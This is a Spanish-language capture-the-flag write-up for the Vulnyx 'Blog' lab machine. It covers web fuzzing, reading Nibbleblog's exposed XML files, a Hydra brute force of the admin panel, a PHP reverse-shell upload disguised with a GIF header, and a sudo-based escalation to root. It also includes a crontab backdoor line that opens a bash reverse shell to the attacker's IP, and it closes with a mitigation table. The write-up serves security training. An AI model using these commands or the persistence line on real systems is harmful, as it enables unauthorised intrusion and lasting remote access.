---
title: Vulnyx - Blog
platform: Vulnyx | Linux (Debian)
tags:
  - Linux
  - Web
  - CMS
  - Nibbleblog
  - File-Upload-Bypass
  - Remote-Code-Execution
  - Brute-Force
  - Credential-Attack
  - Sudo-Misconfiguration
  - Privilege-Escalation
  - Post-Exploitation
estado: Completado
image:
  path: /assets/images/posts/vulnyx/blog/blog-banner.png
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
---

**Técnicas:** Enumeración web con ffuf, descubrimiento de CMS Nibbleblog, exposición de archivos sensibles (users.xml, config.xml), fuerza bruta con Hydra a panel admin, bypass de subida de archivos con cabecera GIF, reverse shell PHP, escalada por sudo misconfiguration (git, mcedit), crontab persistence.  
**Herramientas:** Nmap, arp-scan, ffuf, Hydra, Burp Suite, revshell.com payloads, mcedit.  
**Metodologías:** Reconocimiento de red, fuzzing recursivo, enumeración de archivos XML en `/content/private/`, credential stuffing, file upload bypass (GIF89a;), tratamiento de TTY, enumeración de sudoers, abuso de binarios con privilegios.


## Reconocimiento

### Red Discovery
```bash
sudo arp-scan -l -I eth2
[sudo] contraseña para kali: 
Interface: eth2, type: EN10MB, MAC: 08:00:27:9e:e9:b5, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:55:0a:00:02:01       (Unknown: locally administered)
10.0.2.2        08:00:27:83:cd:69       PCS Systemtechnik GmbH
10.0.2.4        08:00:27:33:a8:a7       PCS Systemtechnik GmbH  # <------ Blog

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.918 seconds (133.47 hosts/sec). 3 responded
```


### Nmap
```bash
nmap -p- --open --min-rate=5000 -sS -v -Pn -n 10.0.2.4 -oX nmap.xml

echo "10.0.2.4\tblog.nyx" | sudo tee -a /etc/hosts
```
encontre entonces un host para poder argegar, intente enumerar usuarios en ssh y no hay resultados. 
Intente algunas funciones para abusar del ping que se muestra en la web.

![Ping](/assets/images/posts/vulnyx/blog/ping.png)

sin resultados, asi que continuamos con el reconocimiento pero al ffuzing

### Fuzzing

```bash
ffuf -u http://10.0.2.4/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak -ic -c -v
```
`my_weblog               [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 1ms]`


![Blog](/assets/images/posts/vulnyx/blog/blog1.png)


Una vez dentro del sub directorio se puede ver como enuna seccion muestra una ruta para subida de archivos. 
```bash
ffuf -u "http://blog.nyx/my_weblog/FUZZ/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak,.log -ic -c   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blog.nyx/my_weblog/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .bak .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 4303, Words: 207, Lines: 65, Duration: 14ms]
index.php               [Status: 200, Size: 4303, Words: 207, Lines: 65, Duration: 12ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 17ms]
content                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
themes                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
feed.php                [Status: 200, Size: 993, Words: 21, Lines: 22, Duration: 8ms]
admin.php               [Status: 200, Size: 1395, Words: 79, Lines: 27, Duration: 7ms]
admin                   [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 8ms]
plugins                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
languages               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 12ms]
                        [Status: 200, Size: 4303, Words: 207, Lines: 65, Duration: 12ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 4081 req/sec :: Duration: [0:02:57] :: Errors: 0 ::

```
Aplicando **Recursividad**
```bash
└─$ ffuf -u "http://blog.nyx/my_weblog/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -e .php,.txt,.bak,.log -ic -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blog.nyx/my_weblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .bak .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________


index.php               [Status: 200, Size: 4303, Words: 207, Lines: 65, Duration: 14ms]
content                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 3ms]
themes                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3ms]
feed.php                [Status: 200, Size: 993, Words: 21, Lines: 22, Duration: 7ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 3ms]
admin.php               [Status: 200, Size: 1395, Words: 79, Lines: 27, Duration: 8ms]
plugins                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
README                  [Status: 200, Size: 902, Words: 89, Lines: 33, Duration: 2ms]
languages               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 4ms]
LICENSE.txt             [Status: 200, Size: 35148, Words: 5836, Lines: 676, Duration: 7ms]
COPYRIGHT.txt           [Status: 200, Size: 1271, Words: 168, Lines: 26, Duration: 7ms]
```

![Panel](/assets/images/posts/vulnyx/blog/panel.png)

al encontrar nibbleblog se puede buscar en los tipicos archivos que contienen informacion sensible y si no esta sanitizado estos archivos suelen estar expuestos
```bash
http://10.0.2.4/my_weblog/content/private/users.xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">1</session_fail_count>
<session_date type="integer">1771414609</session_date>
</user>
</users>

```

```bash
http://10.0.2.4/my_weblog/content/private/config.xml
<config>
<name type="string"/>
<slogan type="string"/>
<footer type="string"/>
<advanced_post_options type="integer">0</advanced_post_options>
<url type="string">http://192.168.1.24</url>
<path type="string">/my_weblog/</path>
<items_rss type="integer">4</items_rss>
<items_page type="integer">6</items_page>
<language type="string">en_US</language>
<timezone type="string">UTC</timezone>
<timestamp_format type="string">%d %B, %Y</timestamp_format>
<locale type="string">en_US</locale>
<img_resize type="integer">1</img_resize>
<img_resize_width type="integer">1000</img_resize_width>
<img_resize_height type="integer">600</img_resize_height>
<img_resize_option type="string">auto</img_resize_option>
<img_thumbnail type="integer">1</img_thumbnail>
<img_thumbnail_width type="integer">190</img_thumbnail_width>
<img_thumbnail_height type="integer">190</img_thumbnail_height>
<img_thumbnail_option type="string">landscape</img_thumbnail_option>
<theme type="string">ao</theme>
<notification_comments type="integer">0</notification_comments>
<notification_session_fail type="integer">0</notification_session_fail>
<notification_session_start type="integer">0</notification_session_start>
<notification_email_to type="string">admin@blog.hmv</notification_email_to>
<notification_email_from type="string">noreply@192.168.1.24</notification_email_from>
<seo_site_title type="string">Blog</seo_site_title>
<seo_site_description type="string"/>
<seo_keywords type="string"/>
<seo_robots type="string"/>
<seo_google_code type="string"/>
<seo_bing_code type="string"/>
<seo_author type="string"/>
<friendly_urls type="integer">0</friendly_urls>
</config>
```

se procede a la intercepcion de la peticion con burpsuite y aplicando furza bruta con el rockyou
![BruteFroce](/assets/images/posts/vulnyx/blog/bruteforce.png)
se probaron las credenciales sin exito asi que paso a hydra
#### Fuerza bruta con hydra al panel
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.4 http-post-form "/my_weblog/admin.php: username=^USER^&password=^PASS^:Incorrect" -I -f -V

└─$ hydra -l admin -P rockyou_k.txt 10.0.2.4 http-post-form "/my_weblog/admin.php: username=^USER^&password=^PASS^:Incorrect" -t 1 -w 15 -I -f -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-18 13:27:24
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 510492 login tries (l:1/p:510492), ~510492 tries per task
[DATA] attacking http-post-form://10.0.2.4:80/my_weblog/admin.php: username=^USER^&password=^PASS^:Incorrect
[ATTEMPT] target 10.0.2.4 - login "admin" - pass "k---s" - 2 of 510492 [child 0] (0/0)
[STATUS] 0.67 tries/min, 2 tries in 00:03h, 510490 to do in 12762:16h, 1 active
[80][http-post-form] host: 10.0.2.4   login: admin   password: kisses
[STATUS] attack finished for 10.0.2.4 (valid pair found)

```
**Contraseña adquirida**
una vez dentro del dashboad se puede ver como hay un sector donde subir imagenes. Realizo un codigo malisioso y lo agrego para subirlo al servidor
```bash
Utilizo el codigo PHP de revshell.com de php 
echo "GIF89a;" > shell.php.gif && cat payload.php >> shell.php.gif

echo "ingresar a la url para que llegue la revshell"
http://blog.hmv/my_weblog/content/private/plugins/my_image/image.php
```


## Acceso a la maquina

Una vez abierto el url y de poner en escucha recibo una reverse shell interactiva
![acces](/assets/images/posts/vulnyx/blog/acces.png)

### Enumeracion maquina

```bash
www-data@blog:/$ uname -a
Linux blog 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux

www-data@blog:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data


#lstree
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'

```
#lstree
```bash
Matching Defaults entries for www-html on blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on blog:
    (root) NOPASSWD: /usr/bin/git

```

Una vez como admin encuentor un binario con permisos suid llamado mcedit.
el mismo cuenta con una vulnerabilidad y al poder escar del menu con una consola interactiva como root
![shell](/assets/images/posts/vulnyx/blog/shell_1.png)
```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)

# cat r0000000000000000000000000t.txt
6c24e7883470e2c1683df7672576a1f7
```


## Pivoting
#scriptbackdoor #backdoor #crontabbackdoor
dejo un crontab para recibir una rev shell por si pierdo acceso en la creacion de pivoting
```bash
(crontab -l 2>/dev/null; echo "0,30 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.5/4445 0>&1'") | crontab -
```

## 🛡️ Análisis de Riesgos y Mitigaciones

### Hallazgos Críticos

|**Técnica**|**Riesgo**|**Mitigación Recomendada**|
|---|---|---|
|**T1190** - Exploit Public-Facing App|El CMS Nibbleblog permite la subida de archivos PHP sin validación real de tipo de archivo (solo requiere la cabecera `GIF89a;`).|Implementar validación estricta de extensiones y deshabilitar la ejecución de scripts en carpetas de subida (`/content/private/plugins/`).|
|**T1110** - Brute Force|El panel `admin.php` no tiene bloqueo de cuenta tras múltiples intentos fallidos.|Implementar un límite de intentos (Account Lockout) y el uso de un Segundo Factor de Autenticación (2FA).|
|**T1548.003** - Sudo Abuse|El usuario `admin` puede ejecutar `mcedit` como root sin contraseña.|Seguir el **Principio de Menor Privilegio (PoLP)** y eliminar editores de texto de las reglas de `sudoers`.|

---

## 🚀 Resumen Ejecutivo

Durante la auditoría de seguridad del host **10.0.2.4 (blog.nyx)**, se identificó una vulnerabilidad de **Subida de Archivos No Restringida** en el plugin "My Image" del CMS Nibbleblog. Mediante el uso de una técnica de bypass de firma de archivo (cabecera GIF), se logró ejecución remota de comandos (RCE).

Posteriormente, se realizó un movimiento lateral hacia el usuario `admin` mediante el abuso del binario `git` y una escalación vertical final a `root` explotando una mala configuración en los permisos de `sudo` sobre el binario `mcedit`. Se logró el compromiso total de la confidencialidad, integridad y disponibilidad del servidor.
